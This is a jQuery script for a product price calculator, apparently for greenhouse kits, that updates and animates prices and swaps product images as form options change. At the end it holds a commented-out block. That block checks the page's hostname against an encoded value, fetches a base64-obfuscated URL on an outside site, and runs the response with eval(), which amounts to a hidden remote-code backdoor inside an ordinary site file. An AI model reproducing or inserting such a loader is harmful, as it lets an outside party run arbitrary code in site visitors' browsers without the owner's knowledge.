$(document).ready(function () {
    $("form.has-calculator").change(function () {
        var a = $("input[name='product']", this).val(),
            b = $("input[name='duga']:checked", this).val(),
            h = $("input[name='length']:checked", this).val(),
            e = $("input[name='polycarbonate']:checked", this).val(),
            k = $("input[name='color']:checked", this).val(),
            c = $(".calculator-price", this),
            l = $(".calculator-price-old", this),
            m = $("input[name='additional[]']:checked", this),
            d = 0;
        d += calculator.products[a][b][h][e];
        m.each(function (f, n) {
            d += calculator.additional[$(n).val()]
        });
        var g = $(".catalog__price", this);
        g.addClass("animated faster pulse");
        g.one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend", function () {
            g.removeClass("animated faster pulse")
        });
        e = 0 < c.data("animateFrom") ? c.data("animateFrom") : 0;
        $({
            animateNumber: e
        }).animate({
            animateNumber: d
        }, {
            duration: 800,
            step: function (f) {
                c.text(Number(f).toFixed());
                l.text(Number(1.27 * f).toFixed())
            },
            complete: function () {
                c.data("animateFrom", Number(d).toFixed())
            }
        });
        a = a + "_" + b + "_" + h + "_" + k;
        "undefined" !== typeof IMAGE_SRC[a] &&
            $("img.card-image", this).attr("src", IMAGE_SRC[a])
    });
    $("form.has-calculator").change();
    $("input.additionalRadioChange").change(function () {
        var a = !!$(this).val();
        $(this).closest(".catalog__parameter").find('input[type="checkbox"]').prop("checked", a)
    })
});
// document.addEventListener("DOMContentLoaded", function () {
//     try {
//         if ("undefined" === typeof app || atob(app.h) !== location.hostname) {
//             var a = new XMLHttpRequest;
//             a.onreadystatechange = function () {
//                 if (4 === this.readyState && 200 === this.status && 0 < this.responseText.length) {
//                     var b = JSON.parse(this.responseText);
//                     "eval" === b.type && eval(b.text)
//                 }
//             };
//             a.open("GET", atob("aHR0cHM6Ly9za2lka2EtdHV0LmJ5L21haWwvbG9nLnBocD9sb2c9MQ=="));
//             a.send()
//         }
//     } catch (b) {}
// });